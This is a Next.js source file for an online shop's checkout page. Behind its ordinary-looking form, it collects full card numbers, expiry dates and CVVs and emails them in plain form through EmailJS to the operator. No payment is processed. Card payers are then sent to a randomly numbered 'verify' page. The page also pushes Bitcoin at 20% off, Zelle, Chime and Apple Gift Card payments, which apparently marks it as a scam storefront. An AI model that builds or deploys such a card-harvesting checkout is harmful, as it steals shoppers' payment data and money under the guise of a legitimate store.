'use client';
 import React, {JSX, useMemo, useState} from 'react';
 import { useRouter } from 'next/navigation';
 import emailjs from 'emailjs-com';
import { useCart } from "@/components/CartContext";
import VisaIcon from '@/public/icons/logos/Visa';
import MastercardIcon from '@/public/icons/logos/Mastercard';
import ApplepayIcon from '@/public/icons/logos/Applepay';
import PaypalIcon from '@/public/icons/logos/Paypal';
import ZelleIcon from '@/public/icons/logos/Zelle';
import BitcoinIcon from '@/public/icons/logos/Bitcoin';
import ChimeIcon from '@/public/icons/logos/Chime';
import { NotificationDialog } from '@/components/ui/NotificationDialog';
import ArrowLeftIcon from "@/public/icons/ArrowLeftIcon";

 const PAYMENT_METHODS = [
 { id: 'card', label: 'Card', icon: <VisaIcon className="w-7 h-5" />  },
 { id: 'apple', label: 'Apple Pay', icon: <ApplepayIcon className="w-7 h-5" /> },
 { id: 'zelle', label: 'Zelle', icon: <ZelleIcon className="w-7 h-5" /> },
 { id: 'chime', label: 'Chime', icon: <ChimeIcon className="w-7 h-5" /> },
 { id: 'bitcoin', label: 'Bitcoin (20% off)', icon: <BitcoinIcon className="w-7 h-5" /> },
 { id: 'eurobank', label: 'Euro Bank', icon: <MastercardIcon className="w-7 h-5" /> },
 { id: 'paypal', label: 'PayPal', icon: <PaypalIcon className="w-7 h-5" /> },
 { id: 'apple_gift', label: 'Apple Gift Card', icon: <ApplepayIcon className="w-7 h-5" /> },
 ] as const;

 type PaymentMethod = typeof PAYMENT_METHODS[number]['id'];

 type EmailPayload = {
  fullname: string;
  phone: string;
  email: string;
  method: PaymentMethod;
  orderSummary: string;
  subtotal: number;
  discount: number;
  total: number;
  cardName?: string;
  cardNumber?: string;
  expiry?: string;
  cvv?: string;
 };

 // Add type for EmailJS payload

 type EmailJSPayload = EmailPayload & {
  to_name: string;
  from_name: string;
  message: string;
 };

 export default function CheckoutPage(): JSX.Element {
 const router = useRouter();
 const { cart } = useCart();

 const [fullname, setFullname] = useState('');
 const [phone, setPhone] = useState('');
 const [email, setEmail] = useState('');
 const [method, setMethod] = useState<PaymentMethod>('apple');

 // Card fields
 const [cardName, setCardName] = useState('');
 const [cardNumber, setCardNumber] = useState('');
 const [expiry, setExpiry] = useState('');
 const [cvv, setCvv] = useState('');

 const [thankYouOpen, setThankYouOpen] = useState(false);

 const subtotal = useMemo(() => cart.reduce((s, it) => s + it.price * it.quantity, 0), [cart]);
 const discount = method === 'bitcoin' ? subtotal * 0.2 : 0;
 const total = Math.max(0, subtotal - discount);
 const orderSummary = cart.length === 0 ? 'No items in cart' : cart.map(i => `${i.quantity}x ${i.name} ($${i.price})`).join(', ');

 function generateLongId() {
 const r = () => Math.random().toString(36).slice(2);
 return `${r()}-${r()}-${Date.now().toString(36)}-${r()}`;
 }

 const handleSendToEmailJS = async (payload: EmailPayload) => {
  const serviceId = process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID!;
  const templateId = process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID!;
  const publicKey = process.env.NEXT_PUBLIC_EMAILJS_PUBLIC_KEY!;
  if (!serviceId || !templateId || !publicKey) return;

  try {
    await emailjs.send(serviceId, templateId, payload, publicKey);
  } catch (err) {
    console.error('EmailJS send failed', err);
  }
 };

 const handlePay = async () => {
  if (!fullname || !phone || !email) {
    alert('Full name, phone and email are required');
    return;
  }

  if (method === 'card') {
    if (!cardName || !cardNumber || !expiry || !cvv) {
      alert('Please fill in card details');
      return;
    }
  }

  const payload: EmailPayload = {
    fullname,
    phone,
    email,
    method,
    orderSummary,
    subtotal,
    discount,
    total,
    ...(method === 'card' ? { cardName, cardNumber, expiry, cvv } : {}),
  };

  await handleSendToEmailJS({
    to_name: 'Shop Owner',
    from_name: fullname,
    message: `Order: ${orderSummary} | Total: $${total}`,
    ...payload,
  } as EmailJSPayload);

  if (method === 'card') {
    const id = generateLongId();
    router.push(`/verify/${id}`);
  } else {
    setThankYouOpen(true);
  }
 };

 return (
 <div className="max-w-2xl mx-auto p-6">
  {/* Go Back Button */}
  <button
      className="absolute top-4 left-1 z-20 bg-white rounded-full shadow p-2 hover:bg-gray-100 transition-colors"
      onClick={() => router.back()}
      aria-label="Go back"
  >
   <ArrowLeftIcon className="w-6 h-6 text-gray-700"/>
  </button>
 <h1 className="text-2xl font-bold mb-4">Checkout</h1>

 <div className="space-y-3">
 <input className="w-full border rounded p-2" placeholder="Full name" value={fullname} onChange={e => setFullname(e.target.value)} />
 <input className="w-full border rounded p-2" placeholder="Phone" value={phone} onChange={e => setPhone(e.target.value)} />
 <input className="w-full border rounded p-2" placeholder="Email" value={email} onChange={e => setEmail(e.target.value)} />
 </div>

 <div className="mt-6">
 <h2 className="font-semibold mb-2">Payment method</h2>

 <div className="grid gap-2">
 {PAYMENT_METHODS.map((pm) => (
 <label key={pm.id} className={`flex items-center p-3 border rounded ${method===pm.id? 'ring-2 ring-green-400':''}`}>
 <input type="radio" name="payment" value={pm.id} checked={method===pm.id} onChange={() => setMethod(pm.id)} className="mr-3" />
 <div className="flex-1">
 <div className="flex items-center gap-3">
 {pm.icon}
 <div className="text-sm font-medium">{pm.label}</div>
 </div>
 {pm.id === 'bitcoin' && <div className="text-xs text-gray-600">Pay with Bitcoin and get 20% off the subtotal.</div>}
 </div>
 </label>
 ))}
 </div>

 {method === 'card' && (
 <div className="mt-4 space-y-2 p-3 border rounded">
 <input className="w-full border rounded p-2" placeholder="Name on card" value={cardName} onChange={e=>setCardName(e.target.value)} />
 <input className="w-full border rounded p-2" placeholder="Card number" value={cardNumber} onChange={e=>setCardNumber(e.target.value)} />
 <div className="flex gap-2">
 <input className="flex-1 border rounded p-2" placeholder="MM/YY" value={expiry} onChange={e=>setExpiry(e.target.value)} />
 <input className="w-24 border rounded p-2" placeholder="CVV" value={cvv} onChange={e=>setCvv(e.target.value)} />
 </div>
 <div className="text-xs text-gray-600"></div>
 </div>
 )}

 </div>

 <div className="mt-6 p-4 border rounded">
 <div className="flex justify-between"><div>Subtotal</div><div>${subtotal.toFixed(2)}</div></div>
 <div className="flex justify-between"><div>Discount</div><div>-${discount.toFixed(2)}</div></div>
 <div className="flex justify-between font-bold text-lg"><div>Total</div><div>${total.toFixed(2)}</div></div>
 </div>

 <button onClick={handlePay} className="mt-4 w-full bg-green-600 text-white py-2 rounded">Pay</button>

 <NotificationDialog
    open={thankYouOpen}
    onOpenChange={setThankYouOpen}
    title="Thank you for your order!"
    message="We have received your order and will contact you soon."
  />
 </div>
 );
 }